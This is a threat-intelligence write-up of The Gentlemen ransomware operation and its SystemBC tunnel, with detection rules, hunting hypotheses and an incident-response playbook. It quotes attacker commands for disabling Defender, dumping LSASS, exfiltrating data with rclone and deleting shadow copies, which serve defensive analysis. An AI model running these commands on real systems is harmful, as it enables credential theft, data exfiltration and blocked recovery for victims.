---
date: 2026-04-28
title: "The Gentlemen RaaS + SystemBC: GPO-weaponized domain-wide encryption behind an RC4 SOCKS5 tunnel"
clusters: ["The Gentlemen RaaS"]
cluster_country: "Unattributed e-crime (financially motivated)"
techniques_enterprise: [T1078, T1190, T1059.001, T1562.001, T1562.002, T1562.004, T1053.005, T1543.003, T1484.001, T1003.001, T1046, T1482, T1021.001, T1021.002, T1021.006, T1090.002, T1573.001, T1071.001, T1041, T1486, T1490]
techniques_ics: []
platforms: [windows]
sectors: [manufacturing, healthcare, technology, finance, government]
category: ransomware
---

# The Gentlemen RaaS + SystemBC: GPO-weaponized domain-wide encryption behind an RC4 SOCKS5 tunnel

## TL;DR

The Gentlemen is a ransomware-as-a-service operation profiled by Check Point Research in April 2026 whose affiliates route every post-foothold action through SystemBC's custom RC4-encrypted SOCKS5 proxy over plain TCP, then weaponize Active Directory Group Policy in SYSVOL to push the encryptor to the entire domain in a single operational step. Entry is typically valid accounts over VPN or a FortiOS perimeter exploit (CVE-2024-55591), after which the operator drops `update.exe`, neutralizes defenses (BYOVD `RTCore64.sys`, `sc.exe stop WinDefend`), harvests LSASS, and moves laterally with Impacket — all tunneled through one SOCKS5 fabric so there is no separate egress channel. Impact is X25519 + XChaCha20 AEAD encryption with `vssadmin delete shadows` and `bcdedit recoveryenabled No`, timed to hit the whole AD estate near-simultaneously via `Invoke-GPUpdate /Force`. The durable detection anchors are behavioral: a burst of GPO/SYSVOL modifications from one principal, and a non-browser process holding sustained plain-TCP connections to public IPs with no TLS handshake. This case is one of the earliest in the diary; its README was reconstructed from the committed kill-chain diagram, IOC list and detection rules.

## Attribution and confidence

Cluster: **The Gentlemen RaaS**, an unattributed, financially motivated ransomware-as-a-service operation. Primary source: **Check Point Research** (April 2026), with C2 infrastructure telemetry corroborated by **Silent Push** (SystemBC fabric on AS213790). Attribution confidence: **low (actor identity) / high (mechanism + tradecraft)**. The operator's SystemBC usage, GPO-weaponization push, and BYOVD defense neutralization are documented with high confidence; the human identity behind the brand is not established.

| Overlap candidate | Basis | Assessment |
|---|---|---|
| SystemBC operators broadly | Shared RC4 SOCKS5 proxy tooling | Tool is shared across many crews; not an attribution link on its own |
| FortiGate-access affiliates | ~14,700-device operational watchlist; CVE-2024-55591 | Consistent with an access-broker-fed RaaS supply chain |
| Later repo Gentlemen cases | Same brand, same SystemBC fabric (~1,570 hosts) | Genealogically linked; see below |

Genealogy vs other repo cases: this is the diary's foundational Gentlemen/SystemBC entry. It is the parent of `2026-06-26_GentleKiller-BYOVD-Detection-Engineering` (the operator's EDR-killer suite, `byActor/the-gentlemen-raas-gentlekiller-operator`) and overlaps the SystemBC SOCKS5 relay fabric referenced there (~1,570 victim hosts, backend leak of May 2026). It complements but does not duplicate later ransomware cases such as `2026-06-30_DireWolf-Golang-DoubleExtortion-Ransomware` (Go filecoder) and `2026-06-16_Qilin-CheckPoint-IKEv1`.

## Kill chain — summary table

| Stage | MITRE | Detail |
|---|---|---|
| Initial access (unconfirmed) | T1078, T1190 | Valid accounts over VPN or FortiOS CVE-2024-55591 perimeter exploit; ~14,700-FortiGate operator watchlist |
| SystemBC drop + defense neutralization | T1059.001, T1562.001, T1562.002, T1562.004 | `C:\ProgramData\update.exe`; `sc.exe stop WinDefend`; BYOVD `RTCore64.sys` |
| Persistence + GPO seeding | T1053.005, T1543.003, T1484.001 | `schtasks` MicrosoftEdgeUpdateTaskMachineCore; SYSVOL Scheduled Tasks XML |
| Credential access | T1003.001 | `rundll32 comsvcs.dll` MiniDump, nanodump (handle dup), DPAPI masterkeys; `C:\ProgramData\dump.bin` |
| Discovery + lateral movement | T1046, T1482, T1021.001, T1021.002, T1021.006 | Advanced IP Scanner, AdFind, BloodHound; Impacket smbexec/wmiexec/psexec, all via the tunnel |
| Command and control | T1090.002, T1573.001, T1071.001 | SystemBC RC4 SOCKS5 over plain TCP; 100-byte handshake (50B key + 50B init); no TLS/SNI |
| Exfiltration | T1041 | `rclone copy \\fileserver\share remote:bucket --transfers=64` through the same SOCKS5 fabric |
| Impact | T1486, T1490 | `--gpo` rewrites `gpttmpl.inf` + `ScheduledTasks.xml`, `Invoke-GPUpdate /Force`; X25519 + XChaCha20; `vssadmin delete shadows`; `bcdedit recoveryenabled No` |

![The Gentlemen RaaS + SystemBC kill chain](./kill_chain.svg)

The diagram is two-lane. The left lane is the victim AD enterprise walking from perimeter access through SystemBC drop, GPO-seeded persistence, LSASS theft, tunneled lateral movement and finally GPO-driven mass encryption. The right lane is the SystemBC C2/SOCKS5 fabric: ~10,340 observed C2 IPs on AS213790, the 100-byte RC4 handshake fingerprint, and the proxy command set. The durable detection anchors are the GPO/SYSVOL modification burst and the non-TLS plain-TCP beacon from a non-browser process.

## Stage-by-stage detail

### Stage 1 — Initial access (unconfirmed per intrusion)

The operator's pattern is valid-account access over VPN or exploitation of a FortiOS perimeter device (CVE-2024-55591), fed by a large FortiGate operational watchlist (~14,700 devices). Treat the specific vector as operator-typical, not confirmed for any single victim.

```
T1078  Valid Accounts (VPN)
T1190  Exploit Public-Facing Application (FortiOS CVE-2024-55591)
```

### Stage 2 — SystemBC drop and defense neutralization

```
C:\ProgramData\update.exe            # SystemBC loader
%APPDATA%\Microsoft\winsrv.exe       # secondary
sc.exe stop WinDefend                # disable Defender service
RTCore64.sys                         # BYOVD (vulnerable MSI Afterburner driver)
```

MITRE: T1059.001 PowerShell; T1562.001 Disable or Modify Tools; T1562.002 Disable Windows Event Logging; T1562.004 Disable or Modify System Firewall.

### Stage 3 — Persistence and GPO seeding

```
schtasks /create /tn MicrosoftEdgeUpdateTaskMachineCore ...
SYSVOL\<dom>\Policies\{GUID}\Machine\Preferences\ScheduledTasks\
```

MITRE: T1053.005 Scheduled Task; T1543.003 Windows Service; T1484.001 Group Policy Modification.

### Stage 4 — Credential access (LSASS)

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> C:\ProgramData\dump.bin full
# nanodump (handle duplication); DPAPI masterkey theft
```

MITRE: T1003.001 OS Credential Dumping: LSASS Memory.

### Stage 5 — Discovery and lateral movement

```
Advanced IP Scanner ; AdFind ; BloodHound (SharpHound)
Impacket: smbexec.py / wmiexec.py / psexec.py    # all routed via SystemBC SOCKS5
```

MITRE: T1046 Network Service Discovery; T1482 Domain Trust Discovery; T1021.001 RDP; T1021.002 SMB/Admin Shares; T1021.006 WinRM.

### Stage 6 — Command and control (SystemBC RC4 SOCKS5)

SystemBC speaks a custom RC4-encrypted SOCKS5 over plain TCP with a fixed 100-byte handshake — 50 bytes of RC4 key followed by 50 bytes of RC4-encrypted init payload — and never negotiates TLS. Because it is a raw-TCP proxy, all recon, lateral movement and exfiltration ride a single fabric.

```
handshake: 100 bytes = 50B RC4 key + 50B RC4-encrypted init
transport: plain TCP, no TLS, no SNI
commands:  proxy_init, download_dll, ...
fabric:    ~10,340 C2 IPs (AS213790, Silent Push); ~1,570 victim hosts; ~38-day median dwell
```

MITRE: T1090.002 External Proxy; T1573.001 Symmetric Cryptography; T1071.001 Web Protocols.

### Stage 7 — Exfiltration

```
rclone copy \\fileserver\share remote:bucket --transfers=64   # over the same SOCKS5 tunnel
```

MITRE: T1041 Exfiltration Over C2 Channel.

### Stage 8 — Impact (GPO-driven mass encryption)

The encryptor's `--gpo` flag rewrites `gpttmpl.inf` and `ScheduledTasks.xml` in SYSVOL and forces refresh with `Invoke-GPUpdate /Force`, so the payload lands on every domain-joined host near-simultaneously. Files are encrypted with X25519 key exchange + XChaCha20 AEAD; recovery is inhibited first.

```
vssadmin delete shadows /all /quiet
bcdedit /set {default} recoveryenabled No
# X25519 + XChaCha20 AEAD file encryption, domain-wide
```

MITRE: T1486 Data Encrypted for Impact; T1490 Inhibit System Recovery.

## Detection strategy

### Telemetry that matters

- Windows Security 5136 (directory object modified, `groupPolicyContainer`) and 5145 (SYSVOL share writes to `Machine\Scripts\Startup` / Scheduled Tasks) — the GPO-weaponization burst.
- Defender XDR / Sentinel `DeviceNetworkEvents` + `DeviceProcessEvents` — non-browser processes with sustained plain-TCP connections to public IPs and no TLS-class context.
- Sysmon EID 1/10 — `rundll32 comsvcs.dll MiniDump`, `sc.exe stop WinDefend`, BYOVD driver load.

### Detection coverage

| Engine | File | Logic |
|---|---|---|
| Sigma | sigma/gpo_weaponization_systembc.yml | Burst of gPLink/SYSVOL Startup-script changes by one principal (EID 5136 + 5145) |
| KQL | kql/tcp_beacon_no_tls_systembc.kql | Non-browser process beaconing plain TCP to public IPs with no TLS baseline match |
| YARA | yara/SystemBC_RC4_Heuristic.yar | SystemBC RC4/SOCKS5 key-schedule + protocol-byte heuristic (medium confidence) |
| SPL | spl/defense_impair_edr_bcdedit.spl | Deprecated tombstone — SPL retired repo-wide 2026-05-11; convert the Sigma sibling instead |

No `.spl` is emitted going forward; convert Sigma with `sigma convert -t splunk -p sysmon <rule>.yml` if needed.

### Threat hunting hypotheses

- **H1** — A single principal (non-DC computer or user account) makes multiple `gPLink` / SYSVOL Startup-script modifications within a short window (mass GPO weaponization before a domain-wide push).
- **H2** — A non-browser process maintains sustained outbound plain-TCP connections to public IPs on commodity ports with no matching TLS handshake (SystemBC SOCKS5 fabric).
- **H3** — `rundll32 comsvcs.dll MiniDump` or nanodump activity writing to `C:\ProgramData\` shortly before Impacket-style lateral movement.

## Incident response playbook

### First 60 minutes (triage)

1. Identify and freeze recently modified GPOs; diff `gpttmpl.inf` and `ScheduledTasks.xml` in SYSVOL against a known-good backup.
2. Block/scope the SystemBC egress: enumerate non-browser processes with plain-TCP public connections and isolate those hosts.
3. Check for `C:\ProgramData\update.exe`, `%APPDATA%\Microsoft\winsrv.exe`, and `C:\ProgramData\dump.bin`.
4. Assume LSASS/DPAPI exposure — begin credential rotation planning (domain and service accounts, krbtgt).
5. Verify backup immutability before any restore; expect `vssadmin`/`bcdedit` recovery inhibition.

### Artifacts to collect

| Artifact | Path | Tool | Why |
|---|---|---|---|
| GPO / SYSVOL changes | \\<dc>\SYSVOL\<dom>\Policies\{GUID}\ | AD replication metadata / EVTX 5136,5145 | Reveals the weaponization push and blast radius |
| SystemBC loader | C:\ProgramData\update.exe | EDR / file collection | Confirms C2 tooling |
| LSASS dump | C:\ProgramData\dump.bin | Triage | Confirms credential theft scope |
| Network flows | DeviceNetworkEvents | SIEM | Maps the SOCKS5 fabric and dwell |

### IR queries and commands

```powershell
# Recently modified GPOs (candidate weaponization)
Get-GPO -All | Sort-Object ModificationTime -Descending |
  Select-Object DisplayName, ModificationTime -First 20
# Presence checks
Test-Path C:\ProgramData\update.exe, C:\ProgramData\dump.bin
```

```kql
// Non-browser plain-TCP beacon to public IPs (see kql/ for the full baseline-join query)
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "ConnectionSuccess" and Protocol == "Tcp"
| where ipv4_is_private(RemoteIP) == false
| where InitiatingProcessFileName !in~ ("msedge.exe","chrome.exe","firefox.exe","outlook.exe","teams.exe")
| summarize Connections=count() by DeviceName, InitiatingProcessFileName, RemoteIP
| where Connections >= 20
```

### Containment, eradication, recovery

- Containment exit criteria: no host still beacons plain-TCP to the SystemBC fabric; weaponized GPOs reverted and re-baselined.
- Eradication: rotate domain/service credentials and krbtgt (twice), remove BYOVD driver and persistence, rebuild encrypted hosts.
- Recovery: restore from offline/immutable backups; re-enable recovery (`bcdedit /set {default} recoveryenabled Yes`).
- What NOT to do: do not trust GPO state without diffing SYSVOL — the payload lives in policy; do not restore before confirming the SOCKS5 fabric is cut.

### Recovery validation

Confirm SYSVOL policy objects match a clean baseline, `recoveryenabled` is `Yes`, no residual `update.exe`/`dump.bin`, and event logging/firewall settings disabled in Stage 2 are restored.

## IOCs

| Type | Value | Context | Confidence | Source |
|---|---|---|---|---|
| ttp | GPO mass gPLink + SYSVOL Startup script writes | The Gentlemen RaaS distribution pattern | high | Check Point Research |
| ttp | SystemBC custom RC4 SOCKS5 over plain TCP | C2 fingerprint (100-byte handshake) | high | Check Point Research |
| ttp | bcdedit recoveryenabled No | Recovery inhibition pre-encryption | high | Check Point Research |
| ttp | X25519 + XChaCha20 file encryption | Modern AEAD ransomware crypto | high | Check Point Research |
| path | C:\ProgramData\update.exe | SystemBC loader | medium | Check Point Research |
| path | C:\ProgramData\dump.bin | LSASS MiniDump output | medium | Check Point Research |

No public file hashes are pinned in this case — the operator rotates payloads; use a vendor-confirmed feed before blocking. The C2 fabric (~10,340 IPs, AS213790) decays; re-validate before enforcing. Full machine-readable set in `iocs.csv`. No CVE is cross-referenced for the case body (CVE-2024-55591 is an operator-typical entry vector, not confirmed per intrusion), so there is no `kev.md`.

## Secondary findings

- **One fabric, no separate egress.** Because SystemBC is a raw-TCP SOCKS5 proxy, recon, lateral movement and rclone exfiltration all share the same channel — cutting the SOCKS5 connection collapses the whole operation, which is why the plain-TCP-no-TLS beacon is such a high-value anchor.
- **Policy is the payload.** GPO weaponization turns Active Directory's own distribution mechanism into the ransomware deployment vehicle; detection must watch SYSVOL/GPO modification, not just endpoint execution.
- **Legacy layout note.** This early folder still carries a deprecated `spl/` tombstone and lacks a `suricata/`/`hunts/` directory; the SPL stub is intentionally a placeholder after the 2026-05-11 SPL retirement.

## Pedagogical anchors

- Group Policy is a deployment channel: a burst of gPLink/SYSVOL changes from one principal is a domain-wide-impact precursor and should page.
- Absence of TLS is a signal, not a gap — a non-browser process speaking sustained plain TCP to public IPs is the SystemBC tell that survives IP rotation.
- When one proxy fabric carries C2, lateral movement and exfiltration, containment has a single high-leverage cut point; find it before touching backups.
- Recovery is a backups problem: X25519 + XChaCha20 is sound, so offline/immutable backups that survive `vssadmin`/`bcdedit` are the only reliable recovery path.

## What's in this folder

| File | Purpose | Link |
|---|---|---|
| README.md | This analysis (reconstructed from committed artifacts). | [README.md](./README.md) |
| kill_chain.svg | Two-lane kill-chain diagram (legacy geometry, pre-canonical palette). | [kill_chain.svg](./kill_chain.svg) |
| sigma/gpo_weaponization_systembc.yml | Sigma: GPO/SYSVOL weaponization burst (EID 5136 + 5145). | [view](./sigma/gpo_weaponization_systembc.yml) |
| kql/tcp_beacon_no_tls_systembc.kql | KQL: non-browser plain-TCP beacon with no TLS baseline. | [view](./kql/tcp_beacon_no_tls_systembc.kql) |
| yara/SystemBC_RC4_Heuristic.yar | YARA: SystemBC RC4/SOCKS5 heuristic. | [view](./yara/SystemBC_RC4_Heuristic.yar) |
| spl/defense_impair_edr_bcdedit.spl | Deprecated SPL tombstone (SPL retired 2026-05-11). | [view](./spl/defense_impair_edr_bcdedit.spl) |
| iocs.csv | Machine-readable IOCs (TTP-level; no pinned hashes). | [iocs.csv](./iocs.csv) |

## Sources

- [Check Point Research — The Gentlemen ransomware / SystemBC (April 2026)](https://research.checkpoint.com/)
- [Check Point Blog — The Gentlemen: a new ransomware threat climbing the charts fast](https://blog.checkpoint.com/research/the-gentlemen-a-new-ransomware-threat-climbing-the-charts-fast/)
- [MITRE ATT&CK — T1484.001 Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/)
- [MITRE ATT&CK — T1090.002 External Proxy](https://attack.mitre.org/techniques/T1090/002/)
- [MITRE ATT&CK — T1486 Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)
